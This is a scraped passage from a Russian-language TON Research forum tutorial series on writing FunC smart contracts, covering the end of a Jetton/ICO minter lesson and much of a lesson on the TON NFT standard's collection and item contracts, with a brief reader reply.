  if (op == op::burn()) { ;; burn
	burn_tokens(in_msg_body, sender_address, msg_value, fwd_fee);
	return ();
  }

  throw(0xffff);
}
```

#### [](#get-33)Get метод

По стандарту [Jetton](https://github.com/ton-blockchain/TIPs/issues/74) смарт-контракт кошелек должен реализовывать Get метод, который возвращает:

```
`balance` - (uint256) количество жетонов на кошельке.
`owner` - (MsgAddress) адрес владельца кошелька;
`jetton` - (MsgAddress) адрес мастер контракта;
`jetton_wallet_code` - (cell) с кодом этого кошелька;
```

То есть просто выгрузить постоянные данные:

```
(int, slice, slice, cell) get_wallet_data() method_id {
  return load_data();
}
```

## [](#jetton-minter-icofc-34)jetton-minter-ICO.fc

Данный файл является вариацией мастер контракта, для ситуации, когда вы хотите проводить ICO.

> ICO(Initial Coin Offering) - первичное размещение монет, форма привлечения инвестиций в виде продажи инвесторам фиксированного количества новых единиц криптовалют/токенов.

Единственным существенным различием от jetton-minter.fc является наличие возможности получить себе токены отправив Тон на контракт.

Также из конкретного этого контракта убрали необязательные `op`, которые были в jetton-minter.fc

## [](#jetton-minter-icofc-35)jetton-minter-ICO.fc

Данный файл является вариацией мастер контракта, для ситуации, когда вы хотите проводить ICO.

> ICO(Initial Coin Offering) - первичное размещение монет, форма привлечения инвестиций в виде продажи инвесторам фиксированного количества новых единиц криптовалют/токенов.

Единственным существенным различием от jetton-minter.fc является наличие возможности получить себе токены отправив Тон на контракт.

Также из конкретного этого контракта убрали необязательные `op`, которые были в jetton-minter.fc

##### [](#ico-recv_internal-36)Разбираем механику ICO в recv\_internal()

Баланс входящего сообщения (в наноТонах) это `msg_value`. Из него мы вычтем небольшое количество наноТонов для сообщения чеканки и получившееся значение будет обменено на токены стандарты Jetton в некоторой пропорции.

Проверяем, что тело сообщения не пустое:

```
if (in_msg_body.slice_empty?()) { ;; buy jettons for Toncoin


}
```

Вычисляем кол-во наноТон для обмена на токены стандарта Jetton:

```
  int amount = 10000000; ;; for mint message
  int buy_amount = msg_value - amount;
```

Проверим, что получилось не отрицательное значение, выдадим исключение если наоборот:

```
throw_unless(76, buy_amount > 0);
```

Устанавливаем пропорцию:

```
int jetton_amount = buy_amount; ;; rate 1 jetton = 1 toncoin; multiply to price here
```

Далее собираем сообщение для функции `mint_tokens()`:

```
  var master_msg = begin_cell()
        .store_uint(op::internal_transfer(), 32)
        .store_uint(0, 64) ;; quert_id
        .store_coins(jetton_amount)
        .store_slice(my_address()) ;; from_address
        .store_slice(sender_address) ;; response_address
        .store_coins(0) ;; no forward_amount
        .store_uint(0, 1) ;; forward_payload in this slice, not separate cell
        .end_cell();
```

Вызываем функцию чеканки токенов:

```
mint_tokens(sender_address, jetton_wallet_code, amount, master_msg);
```

А также сохраняем постоянные данные, изменяя общее предложение токенов стандарта Jetton. И заканчиваем выполнение функции `recv_internal()`.

```
save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
return ();
```

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/9lesson/ninthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

```
# Урок 9 Стандарт Jetton

## Предисловие - зачем нужны токены и стандарты

#### Что такое токен

Токен - это единица учета некоторого цифрового актива в некоторой сети. Важно отметить, что под токеном обычно не подразумевают криптовалюту, а подразумевают запись, распределенную в блокчейне, которой управляют с помощью смарт-контрактов. В смарт-контракте записаны значения остатков на счетах держателей токенов, также смарт-контракт предоставляет возможность перевода токенов с одного счёта на другой.

#### Что такое взаимозаменяемый(fungible) и невзаимозаменяемый(nonfungible) токен?

Одной из возможных классификаций токенов, является классификация по взаимозаменяемости.

**Взаимозаменяемые токены** — это активы, которые не уникальны и могут быть легко обменены на другой актив такого же типа. Такие токены сделаны таким образом, что каждый токен эквивалентен следующему токену.

**Невзаимозаменяемые токены** — это активы, каждый экземпляр которого уникален (специфичен) и не может быть замещён другим аналогичным активом. Невзаимозаменяемый токен представляет собой некоторый сертификат цифрового объекта с возможностью передавать сертификат через некоторый механизм.

#### Зачем нужен стандарт токена и что это такое

Для того, чтобы токены можно было использовать в других приложениях (от кошельков до децентрализованных бирж) вводятся стандарты интерфейсов смарт-контрактов для токенов.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/9lesson/ninthlesson.md)

 

[hustupirki](https://tonresear.ch/u/hustupirki) November 28, 2024, 12:48pm  2

Статья полезная! Так же можно упомянуть, что один из проектов на базе токена Jetton - это игровая платформа [Jetton Games](https://jettongame.click/) в Telegram Mini App

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 466

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 10 Разбираем стандарт NFT(Non-Fungible Token)](/t/func-10-nft-non-fungible-token/466)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:45pm  1

# [](#h-10-nft-1)Урок 10 Стандарт NFT

В 9 уроке мы разобрали, что есть деление токенов на невзаимозаменяемые и взаимозаменяемые, а также как выглядит стандарт взаимозаменяемых токенов, в этом уроке мы обсудим невзаимозаменяемые токены и разберем примеры по стандарту.

## [](#nft-ton-2)Что такое стандарт NFT в TON

Итак, невзаимозаменяемые токены - это активы, каждый экземпляр которого уникален (специфичен) и не может быть замещён другим аналогичным активом. Невзаимозаменяемый токен представляет собой некоторый сертификат цифрового объекта с возможностью передавать сертификат через некоторый механизм.

[Стандарт NFT в TON](https://github.com/ton-blockchain/TIPs/issues/62) описывает:

*   Изменение формы собственности.
*   Способ объединения предметов в коллекции.
*   Способ дедупликации общей части коллекции.

> Дедупликация - метод исключения дублирующих копий, повторяющихся данных

Как и для Jetton, в стандарте NFT есть мастер-контракт - контракт коллекции и смарт-контракты для отдельной NFT в коллекции. В стандарте есть отличный пример: Если вы выпустите коллекцию, содержащую 10 000 элементов, то вы развернете 10 001 смарт-контракт, один контракт коллекции и 10000 контрактов для каждого элемента.

> В стандарте NFT также объясняется почему выбрана именно такая схема реализации NFT, с таким количеством контрактов, пункт - Rationale и следующий за ним.

В TON для [стандарта NFT](https://github.com/ton-blockchain/TIPs/issues/62) есть расширения(на 29.07.2022 часть из них в Драфтах):

*   [NFTRoyalty](https://github.com/ton-blockchain/TIPs/issues/66) - о способе получения информации о выплате роялти и обеспечении универсальную поддержку выплат роялти на всех торговых площадках NFT и участниках экосистемы.
*   [NFTBounceable](https://github.com/ton-blockchain/TIPs/issues/67) - о способ отката NFT-переводов, если получатель отклонил уведомление. (Например, если NFT был отправлен не на тот адрес, а смарт-контракт получателя не знает, как взаимодействовать с NFT.)
*   [NFTEditable](https://github.com/ton-blockchain/TIPs/issues/68) - об массовых изменениях NFT
*   [NFTUpgradable](https://github.com/ton-blockchain/TIPs/issues/69) - об изменяемых NFT

#### [](#nft-3)Функциональность контрактов по стандарту NFT

Стандарт описывает два ключевых смарт-контракта для NFT:

*   смарт-контракт коллекции
*   смарт-контракт отдельной NFT

> В [примерах](https://github.com/ton-blockchain/token-contract/tree/main/nft) также есть смарт-контракт реализующий продажу и некое подобие маркетплейса, но в данном уроке эти контракты мы разбирать не будем, сфокусируемся на стандарте NFT.

Смарт-контракт коллекции, должен реализовывать:

*   развертывание(деплой) смарт-контракты элементов NFT этой коллекции. (в примере, который мы будет разбирать будет и деплой одной NFT и массовый деплой NFT)
*   Get-метод `get_collection_data()` , который вернет адрес владельца коллекции, контент коллекции, и счетчик текущих NFT в коллекции
*   Get-метод `get_nft_address_by_index(int index)`, который по номеру элемента NFT этой коллекции и возвращает адрес (`MsgAddress`) смарт-контракта этого элемента NFT
*   Get-метод `get_nft_content(int index, cell individual_content)`, который возвращает информацию по конкретной NFT в коллекции

Смарт-контракт отдельной NFT, должен реализовывать:

*   Get-метод `get_nft_data()`, которые вернет данные по этой NFT
*   передачу права владения NFT
*   внутренний(internal) метод `get_static_data`, для получения данных об отдельной NFT внутренним сообщением.

> Важно: внутри стандарта также описывается много нюансов относительно комиссий, ограничений и прочего, но слишком подробно мы останавливаться на этом не будем, чтобы урок не превращался в книгу.

#### [](#nft-4)Метаданные под стандарт NFT

*   `uri` - необязательный параметр, ссылка на JSON документ с метаданными.
*   `name` - строка идентификатор NFT, т.е. идентифицирует актив.
*   `description` - описание актива.
*   `image` - URI, указывающий на ресурс с изображением MIME-типа.
*   `image_data` - Либо двоичное представление изображения для макета в сети, либо base64 для макета вне сети.

## [](#h-5)Разбираем код

Перед разбором кода отмечу, что в целом “механики” повторяются, поэтому чем дальше в разбор, тем более верхнеуровневый будет разбор.

Разбирать будем файлы из [репозитория](https://github.com/ton-blockchain/token-contract/tree/main/nft) будем в следующем порядке:

*   nft-collection.fc
*   nft-item.fc

## [](#nft-collectionfc-6)nft-collection.fc

Контракт коллекции начинается с двух вспомогательные функций, для загрузки и выгрузки данных.

##### [](#c4-7)Загружаем и выгружаем данные из c4

В “хранилище контракта коллекции” будет храниться:

*   `owner_address` - адрес владельца коллекции, если владельца нет, то нулевой адрес
*   `next_item_index` - количество развернутых в настоящее время элементов NFT в коллекции\*.
*   `content` - содержимое коллекции в формате, соответствующем стандарту [токена](https://github.com/ton-blockchain/TIPs/issues/64).
*   `nft_item_code` - код отдельной NFT, будет использоваться для “воспроизведения” адреса смарт-контракта.
*   `royalty_params` - параметры роялти

> *   *   Если значение `next_item_index` -1 значит это непоследовательная коллекция, такие коллекции должны предоставлять собственный способ генерации индекса/перечисления элементов.

Напишем вспомогательные функции `load_data()` и `save_data()` которые будут выгружать и загружать данные из регистра с4. (Подробно загрузку и выгрузку разбирать не будем, так как похожий функционал был много раз разобран в предыдущих уроках).

##### [](#h-8)Функции “воспроизведения”

В данном смарт-контракте, нам понадобиться по адресу владельца воспроизводить адрес смарт-контракта с отдельной НФТ этого владельца. Для этого будем использовать тот же “трюк”, что и в примерах по Jetton.

Напомню, если мы изучим [документацию](https://docs.ton.org/develop/howto/step-by-step#3-compiling-a-new-smart-contract), того как компилируется смарт-контракт.

Мы можем увидеть следующее:

Код и данные для нового смарт-контракта объединяются в структуру StateInit (в следующих строках), вычисляется и выводится адрес нового смарт-контракта (равный хешу этой структуры StateInit), а затем внешнее сообщение с создается адрес назначения, равный адресу нового смарт-контракта. Это внешнее сообщение содержит как правильный StateInit для нового смарт-контракта, так и нетривиальную полезную нагрузку (подписанную правильным закрытым ключом).

Для нас это значит, что мы можем получить адрес смарт-контракта отдельной NFT используя `item_index` и код смарт-контракта отдельной NFT, соберем StateInit кошелька.

Подобное возможно, так как функции [хэширования](https://ru.wikipedia.org/wiki/%D0%A5%D0%B5%D1%88-%D1%84%D1%83%D0%BD%D0%BA%D1%86%D0%B8%D1%8F) детерминированы, это значит, что для разных входных данных будет разный хэш,  
при этом для одних и тех же входных данных хэш функция будет возвращать всегда единообразный хэш.

Для этого в смарт-контракте есть функции `calculate_nft_item_state_init()` и `calculate_nft_item_address()`:

```
cell calculate_nft_item_state_init(int item_index, cell nft_item_code) {
  cell data = begin_cell().store_uint(item_index, 64).store_slice(my_address()).end_cell();
  return begin_cell().store_uint(0, 2).store_dict(nft_item_code).store_dict(data).store_uint(0, 1).end_cell();
}

slice calculate_nft_item_address(int wc, cell state_init) {
  return begin_cell().store_uint(4, 3)
					 .store_int(wc, 8)
					 .store_uint(cell_hash(state_init), 256)
					 .end_cell()
					 .begin_parse();
}
```

Функция `calculate_nft_item_state_init()` cобирает StateInit в соответствии с заданным `item_index`.

Функция `calculate_nft_item_address()` собирает адрес в соответствии с [TL-B схемой](https://github.com/ton-blockchain/ton/blob/master/crypto/block/block.tlb#L99).

> для вычисления хэш используется функция`cell_hash()` - она вычисляет хэш представления ячейки.

##### [](#nft-9)Вспомогательная функция деплоя отдельной NFT

> \*Деплой - процесс переноса в сеть (в данном случае отдельной NFT)

Чтобы задеплоить NFT нам надо будет отправить на адрес смарт-контракта необходимую информацию по NFT, соответственно:

*   воспроизведем адрес смарт-контракта отдельной NFT
*   отправим информацию сообщением

Адрес смарт-контракта:

```
	() deploy_nft_item(int item_index, cell nft_item_code, int amount, cell nft_content) impure {
	  cell state_init = calculate_nft_item_state_init(item_index, nft_item_code);
	  slice nft_address = calculate_nft_item_address(workchain(), state_init);

	}
```

workchain() - это вспомогательная функция из `params.fc`. Она определена как низкоуровневый примитив TVM, с помощью ключевого слова `asm`.

```
int workchain() asm "0 PUSHINT";
```

Номер 0 это базовый ворчейн.

Отправляем информацию сообщением:

```
() deploy_nft_item(int item_index, cell nft_item_code, int amount, cell nft_content) impure {
  cell state_init = calculate_nft_item_state_init(item_index, nft_item_code);
  slice nft_address = calculate_nft_item_address(workchain(), state_init);
  var msg = begin_cell()
			.store_uint(0x18, 6)
			.store_slice(nft_address)
			.store_coins(amount)
			.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
			.store_ref(state_init)
			.store_ref(nft_content);
  send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
}
```

##### [](#h-10)Вспомогательная функция отправки параметров Роялти

Эта вспомогательная функция отправит статические данные о роялти в случае внутреннего сообщения в `recv_internal()`.

Технически здесь все просто, отправляем сообщение с `op` кодом `op::report_royalty_params()` :

```
() send_royalty_params(slice to_address, int query_id, slice data) impure inline {
  var msg = begin_cell()
	.store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
	.store_slice(to_address)
	.store_coins(0)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_uint(op::report_royalty_params(), 32)
	.store_uint(query_id, 64)
	.store_slice(data);
  send_raw_message(msg.end_cell(), 64); ;; carry all the remaining value of the inbound message
}
```

#### [](#recv_internal-11)recv\_internal()

Для того, чтобы наша кошелек мог принимать сообщения будем использовать внешний метод `recv_internal()`

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

Внешний метод нашего смарт-контракта коллекции, должен реализовывать:

*   отправку параметров роялти
*   деплой отдельной NFT
*   деплой сразу нескольких NFT (batch deploy)
*   изменение владельца
*   а также большое количество исключений, проверяющих логику работы)

##### [](#h-12)Соберем каркас внешнего метода

Итак первое, что мы сделаем в `recv_internal()` это проверим пустое ли сообщение:

```
  if (in_msg_body.slice_empty?()) { ;; ignore empty messages
	return ();
  }
```

Далее достаем флаги и проверяем не является ли поступившее сообщение отскочившим. В случае если это отскок завершаем работу функции:

```
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
```

Далее достаем адрес отправителя, а также `op` и `query_id`:

```
slice sender_address = cs~load_msg_addr();
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

Выгружаем данные из регистра `с4`:

```
var (owner_address, next_item_index, content, nft_item_code, royalty_params) = load_data();
```

Используя заранее описанную функцию для передачи информации по роялти, отправляем эту информацию:

```
if (op == op::get_royalty_params()) {
    send_royalty_params(sender_address, query_id, royalty_params.begin_parse());
    return ();
}
```

Далее будет функционал, который доступен только владельцу коллекции (выпуск NFT и.т.д), поэтому проверим адрес и выдадим исключение если это не так:

```
throw_unless(401, equal_slices(sender_address, owner_address));
```

С помощью условных операторов и `op` создается дальнейшая логика смарт-контракта:

```
if (op == 1) { ;; deploy new nft

}
if (op == 2) { ;; batch deploy of new nfts

}
if (op == 3) { ;; change owner

}
throw(0xffff);
```

В конце идет исключение, т.е. если контракт не выполнит какое-то действие в соответствии с `op`, будет исключение. Итоговый каркас `recv_internal()`:

```
() recv_internal(cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	var (owner_address, next_item_index, content, nft_item_code, royalty_params) = load_data();

	if (op == op::get_royalty_params()) {
		send_royalty_params(sender_address, query_id, royalty_params.begin_parse());
		return ();
	}

	throw_unless(401, equal_slices(sender_address, owner_address));


	if (op == 1) { ;; deploy new nft

	}
	if (op == 2) { ;; batch deploy of new nfts

	}
	if (op == 3) { ;; change owner

	}
	throw(0xffff);
}
```

##### [](#op-1-nft-13)op == 1 Деплоим NFT

Достаем из тела сообщения индекс отдельной NFT:

```
if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);

  return ();
}
```

Проверяем, что индекс не больше следующего индекса, выгруженного из с4:

```
if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);

  }
  return ();
}
```

Добавим переменную `is_last`, которую мы будем использовать для проверки, а также поменяем значение `item_index` на `next_item_index`.

Сразу же после этого воспользуемся вспомогательной функцией для деплой NFT:

```
 if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);
  var is_last = item_index == next_item_index;
  deploy_nft_item(item_index, nft_item_code, in_msg_body~load_coins(), in_msg_body~load_ref());

}
```

Теперь осталось сохранить данные в регистре `с4`, проверим `is_last`, добавим единицу в счетчик `next_item_index` и сохраним данные в `с4`.

```
 if (op == 1) { ;; deploy new nft
  int item_index = in_msg_body~load_uint(64);
  throw_unless(402, item_index <= next_item_index);
  var is_last = item_index == next_item_index;
  deploy_nft_item(item_index, nft_item_code, in_msg_body~load_coins(), in_msg_body~load_ref());
  if (is_last) {
    next_item_index += 1;
    save_data(owner_address, next_item_index, content, nft_item_code, royalty_params);
  }
  return ();
}
```

В конце заканчиваем выполнение функции с помощью `return ()`.

##### [](#op-2-nft-14)op == 2 Массовый деплой NFT

Массовый деплой это просто деплой NFT циклом, цикл будет проходить по словарю, данные для которого мы просто выгрузим из тела сообщения (ссылка на начало словаря, если говорить простыми словами).

> Подробно на работе со словарями(Hashmaps) мы останавливались в седьмом уроке

Так же считаю важным отметить, что “разовый” массовый деплой в TON ограничен. В [TVM](https://docs.ton.org/learn/tvm-instructions/tvm-overview#tvm-is-a-stack-machine), количество выходных действий в одной транзакции должно быть `<=255`.

> Напомню, что в FunС есть три [цикла](https://docs.ton.org/develop/func/statements#loops): `repeat`,`until`,`while`

Создадим счетчик `counter`, который мы будем использовать в цикле, а также выгрузим ссылку на список NFT.

```
	if (op == 2) { ;; batch deploy of new nfts
	  int counter = 0;
	  cell deploy_list = in_msg_body~load_ref();

	}
```

Далее нам предстоит воспользоваться фукнцией `udict::delete_get_min(cell dict, int key_len)` - вычисляет минимальный ключ `k` в словаре `dict`, удаляет его и возвращает (dict’, x, k, -1), где `dict'`— модифицированная версия `dict`, а x — значение, связанное с `k`. Если `dict` пуст, возвращает (dict, null, null, 0). Последнее значение -1, это флаг, если функция возвращает модифицированный словарь, то флаг равен -1, если нет, то 0. Флаг мы будем использовать, как условие цикла

Итак, обозначим цикл, и используя `udict::delete_get_min(cell dict, int key_len)` будем доставать значения NFT для деплоя.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);

  } until ( ~ f?);
}
```

> ~ - побитовое не ? - условный оператор

Проверим флаг (т.е. есть с чем работать), сразу же после проверки увеличим счетчик `counter`, который мы определили ранее. Делаем мы это для того, чтобы проверить условие, что количество NFT единиц при массовом деплое не выходит за рамки ограничений TVM (об этом писал выше).

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }

  } until ( ~ f?);
}
```

Также проверим, что нет путаницы с индексами, то есть текущий индекс не больше следующего. А после этого задеплоим NFT. Дополнительно, обработаем ситуацию, если номер текущего NFT равен следующему, добавив единичку.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }

      throw_unless(403 + counter, item_index <= next_item_index);
      deploy_nft_item(item_index, nft_item_code, item~load_coins(), item~load_ref());
      if (item_index == next_item_index) {
        next_item_index += 1;
      }
    }
  } until ( ~ f?);

}
```

В самом конце остается сохранить данные и закончить выполнение функции. Итоговый код `op` == 2.

```
if (op == 2) { ;; batch deploy of new nfts
  int counter = 0;
  cell deploy_list = in_msg_body~load_ref();
  do {
    var (item_index, item, f?) = deploy_list~udict::delete_get_min(64);
    if (f?) {
      counter += 1;
      if (counter >= 250) { ;; Limit due to limits of action list size
        throw(399);
      }

      throw_unless(403 + counter, item_index <= next_item_index);
      deploy_nft_item(item_index, nft_item_code, item~load_coins(), item~load_ref());
      if (item_index == next_item_index) {
        next_item_index += 1;
      }
    }
  } until ( ~ f?);
  save_data(owner_address, next_item_index, content, nft_item_code, royalty_params);
  return ();
}
```

##### [](#op-3-15)op == 3 Изменение владельца

В примере смарт-контракта коллекции предусмотрен функционал изменения владельца коллекции - меняется адрес. Работает это так:

*   достаем из тела сообщения адрес нового владельца с помощью `load_msg_addr()`
*   сохраняем данные в регистре `c4` с новым владельцем

```
if (op == 3) { ;; change owner
    slice new_owner = in_msg_body~load_msg_addr();
    save_data(new_owner, next_item_index, content, nft_item_code, royalty_params);
    return ();
}
```

#### [](#get-16)Get-методы

В нашем примере есть четыре Get-метода:

*   get\_collection\_data() - возвращает информацию о коллекции(адрес владельца, метаданные по [стандарту Токена](https://github.com/ton-blockchain/TIPs/issues/64) о коллекции, и счетчик индексов NFT)
*   get\_nft\_address\_by\_index(int index) - по индексу воспроизводит смарт-контракт NFT
*   royalty\_params() - возвращает параметры роялти
*   get\_nft\_content(int index, cell individual\_nft\_content) - возвращает информацию по конкретной NFT в коллекции

> Роялти в NFT это отчисления всякий раз, когда их NFT переходят из рук в руки на вторичном рынке

Методы get\_collection\_data(),get\_nft\_address\_by\_index(),get\_nft\_content() обязательны для стандарта NFT в TON.

##### [](#get_collection_data-17)get\_collection\_data()

Достаем из регистра `c4` адрес владельца, индекс (количество развернутых в данный момент элементов NFT в коллекции.) и информацию о коллекции и просто возвращаем эти данные.

```
(int, cell, slice) get_collection_data() method_id {
  var (owner_address, next_item_index, content, _, _) = load_data();
  slice cs = content.begin_parse();
  return (next_item_index, cs~load_ref(), owner_address);
}
```

##### [](#get_nft_address_by_index-18)get\_nft\_address\_by\_index()

Получает серийный номер элемента NFT этой коллекции и возвращает адрес (MsgAddress) смарт-контракта этого элемента NFT. Воспроизведение адреса смарт-контракта происходит за счет StateInit(уже разибирали это).

```
slice get_nft_address_by_index(int index) method_id {
	var (_, _, _, nft_item_code, _) = load_data();
	cell state_init = calculate_nft_item_state_init(index, nft_item_code);
	return calculate_nft_item_address(workchain(), state_init);
}
```

##### [](#royalty_params-19)royalty\_params()

Возвращаем параметры роялти. Данная функция относиться к расширению стандарта NFT, а именно [NFTRoyalty](https://github.com/ton-blockchain/TIPs/issues/66).  
`royalty_params()` возвращает числитель, знаменатель и адрес для отправки роялти. Доля роялти — это числитель/знаменатель. Например, если числитель = 11, а знаменатель = 1000, то доля роялти составляет 11/1000 \* 100% = 1,1%. Числитель должен быть меньше знаменателя.

```
(int, int, slice) royalty_params() method_id {
	 var (_, _, _, _, royalty) = load_data();
	 slice rs = royalty.begin_parse();
	 return (rs~load_uint(16), rs~load_uint(16), rs~load_msg_addr());
}
```

##### [](#get_nft_content-20)get\_nft\_content()

Получает серийный номер элемента NFT этой коллекции и индивидуальное содержимое этого элемента NFT и возвращает полное содержимое элемента NFT в формате, соответствующем [стандарту TIP-64](https://github.com/ton-blockchain/TIPs/issues/64).

Здесь важно отметить, как возвращается контент:

```
  return (begin_cell()
					  .store_uint(1, 8) ;; offchain tag
					  .store_slice(common_content)
					  .store_ref(individual_nft_content)
		  .end_cell());
```

`store_uint(1, 8)` \- подобный тэг означает что данные хранятся не в сети, про тэги хранения данных можно почитать в стандарте токена - [Content representation](https://github.com/ton-blockchain/TIPs/issues/64).

Полный код функции:

```
cell get_nft_content(int index, cell individual_nft_content) method_id {
  var (_, _, content, _, _) = load_data();
  slice cs = content.begin_parse();
  cs~load_ref();
  slice common_content = cs~load_ref().begin_parse();
  return (begin_cell()
					  .store_uint(1, 8) ;; offchain tag
					  .store_slice(common_content)
					  .store_ref(individual_nft_content)
		  .end_cell());
}
```

## [](#nft-itemfc-21)nft-item.fc

Смарт-контракт отдельной NFT начинается с вспомогательных функций для работы с регистром `с4`, давайте разберем, что будет храниться в “хранилище” смарт-контракта отдельной NFT.

*   `index` - индекс этой отдельной NFT
*   `collection_address` - адрес смарт-контракта коллекции, к которой принадлежит этот NFT.
*   `owner_address` - адрес текущего владельца этого NFT
*   `content` - контент, если у NFT есть коллекция - индивидуальный контент NFT в любом формате, если у NFT нет коллекции - содержимое NFT в формате, соответствующем стандарту TIP-64.

> Может возникнуть вопрос, а что передавать в `collection_address` и `index`, если нет коллекции, в `collection_address` передадим addr\_none, в `index` передадим произвольное, но постоянное значение.

#### [](#h-22)Загружаем данные

Здесь используем уже знакомые нам `store_` функции:

```
() store_data(int index, slice collection_address, slice owner_address, cell content) impure {
	set_data(
		begin_cell()
			.store_uint(index, 64)
			.store_slice(collection_address)
			.store_slice(owner_address)
			.store_ref(content)
			.end_cell()
	);
}
```

А вот с выгрузкой данных и `c4` будет все посложнее чем в прошлые разы.

#### [](#h-23)Выгружаем данные

Помимо данных из `c4` мы также будет прокидывать значение 0 и -1, в зависимости от того полностью ли инициализирован NFT и готов к взаимодействию.  
Значение мы будем получать следующим образом:

*   сначала выгрузим index, collection\_address из `с4`
*   а потом проверим с помощью функции `slice_bits()` количество битов в оставшихся `owner_address` и `cell content`

```
(int, int, slice, slice, cell) load_data() {
    slice ds = get_data().begin_parse();
    var (index, collection_address) = (ds~load_uint(64), ds~load_msg_addr());
    if (ds.slice_bits() > 0) {
    return (-1, index, collection_address, ds~load_msg_addr(), ds~load_ref());
    } else {
     return (0, index, collection_address, null(), null()); ;; nft not initialized yet
    }
}
```

#### [](#send_msg-24)Вспомогательная функция отправки сообщения send\_msg()

Смарт-контракт отдельной NFT должен поддерживать, следующую функциональность:

*   передача права собственности на NFT
*   получение статических данных NFT

По стандарту и та и та функциональность предполагает отправку сообщений, поэтом напишем вспомогательную функцию отправки сообщений, которая будет принимать:

*   `slice to_address` - адрес куда отправить сообщение
*   `int amount` - количество TON
*   `int op` - код `op` для идентификации операции
*   `int query_id` - query\_id, используемое во всех внутренних сообщениях типа «запрос-ответ». [Подробнее](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages)
*   `builder payload` - некая полезная нагрузка, которую мы хотим передать с сообщением
*   `int send_mode` - Режим отправки сообщения, подробнее о режимах можно прочитать в третьем уроке

Каркас вспомогательной функции отправки сообщения:

```
() send_msg(slice to_address, int amount, int op, int query_id, builder payload, int send_mode) impure inline {

}
```

> Напомню `inline` - значит, что код фактически подставляется в каждом месте вызова функции.

Собираем сообщение, проверяя при этом, что есть `builder payload` и конечно же отправляем сообщение с заданным `mode`.

Итоговый код:

```
() send_msg(slice to_address, int amount, int op, int query_id, builder payload, int send_mode) impure inline {
  var msg = begin_cell()
	.store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
	.store_slice(to_address)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_uint(op, 32)
	.store_uint(query_id, 64);

  if (~ builder_null?(payload)) {
	msg = msg.store_builder(payload);
  }

  send_raw_message(msg.end_cell(), send_mode);
}
```

#### [](#nft-transfer_ownership-25)Функция передачи владением NFT transfer\_ownership()

Чтобы осуществить передачу владением NFT, ключевое, что необходимо:

*   проверить различные условия из [стандарта](https://github.com/ton-blockchain/TIPs/issues/62)
*   отправить сообщение новому владельцу, что право собственности назначено
*   отправить излишек TON обратно, либо на указанный адрес (обратно здесь написано для простоты понимания)
*   сохранить нового владельца в контракте

Итак, функция будет принимать:

`int my_balance` - Баланс (после зачисления стоимости входящего сообщения) смарт-контракта (в наноТонах). В соответствии с [Compute phase](https://docs.ton.org/learn/tvm-instructions/tvm-overview#compute-phase)  
`int index` - индекс отдельной NFT коллекции  
`slice collection_address` - адрес смарт-контракта коллекции  
`slice owner_address` - адрес владельца  
`cell content` - ячейка с контентом NFT  
`slice sender_address` - адрес отправителя сообщения о смене владельца  
`int query_id` - query\_id, используемое во всех внутренних сообщениях типа «запрос-ответ». [Подробнее](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages)  
`slice in_msg_body` - то, что останется от тела сообщения в `recv_internal()`, внутри необходимы нам адреса адреса  
`int fwd_fees` - транзакционные издержки сообщения отправленного в `recv_internal()`, здесь будет использоваться для оценки необходимо значение TON для осуществления операции передачи владением

Функция начинается с проверки, что адрес “отправителя команды о смене владельца” равен адресу владельца, то есть поменять может только текущий владелец.

```
throw_unless(401, equal_slices(sender_address, owner_address));
```

Теперь надо разобрать `force_chain()` из файла params.fc.

```
force_chain(to_owner_address);
```

